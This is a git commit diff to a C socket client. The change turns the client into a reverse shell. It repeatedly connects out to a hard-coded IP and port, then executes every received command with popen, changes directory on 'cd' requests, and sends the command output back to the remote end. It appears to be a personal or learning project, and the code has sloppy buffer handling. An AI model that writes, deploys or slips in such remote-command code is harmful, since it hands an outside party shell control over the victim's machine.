0f810f2464880525126fe6dd3da052b5e9bbe590
m0er1tz <moritzroettel06@gmail.com>
2023-06-13 08:08:22 +0200

    second commit

--- client/client.c
+++ client/client.c
@@ -20,28 +20,47 @@ int main() {
 	int sock = socket(AF_INET, SOCK_STREAM, 0);
 	
 	server_addr.sin_family = AF_INET; 
-	server_addr.sin_port = htons(8080); 
+	server_addr.sin_port = htons(10000); 
 	server_addr.sin_addr.s_addr = inet_addr("192.168.178.20"); 
-	int err; 
+	int err = 12321312; 
 	
 	while(err != 0) {
 		sleep(2);
 		err = connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)); 
 	}
-	printf("%d \n", err); 
-	printf("connected \n"); 	
+
+	sleep(2); 
 	send(sock, msg, sizeof(msg), 0);
-
+	FILE *pipe; 
+	char buffer[500]; 
 	while (1) {
-		memset(buf, 0, sizeof(buf));
-		recv(sock, buf, sizeof(buf), 0);
-		printf("got  >>>    %s  \n", buf);
-		
 
-		if(strcmp(buf, "quit") == 10) {
-			printf("quiting \n");
+
+		memset(buf, 0, sizeof(buf));
+		memset(buffer, 0, sizeof(buffer));
+		recv(sock, buf, sizeof(buf), 0);
+
+		sprintf(buf, "%s", buf);
+		
+		if(buf[0] == 'c' && buf[1] == 'd') {
+			char *buf2 = buf + 3; 
+			printf("%s\n", buf2);
+			chdir(buf2);
+			send(sock, "[+] Changed Directory\n", 60, 0);
+		} else {
+			pipe = popen(buf, "r"); 
+			sprintf(buffer, "--------------------------\n");
+			while(fgets(buf, sizeof(buf), pipe) != NULL) {
+				sprintf(buffer, "%s%s", buffer, buf); 
+			}
+			sprintf(buffer, "%s--------------------------", buffer);
+
+			send(sock, buffer, sizeof(buffer), 0);
+		}
+		if(strcmp(buf, "quit") == 0) {
 			break;
 		}
+
 	}
 
 	close(sock);
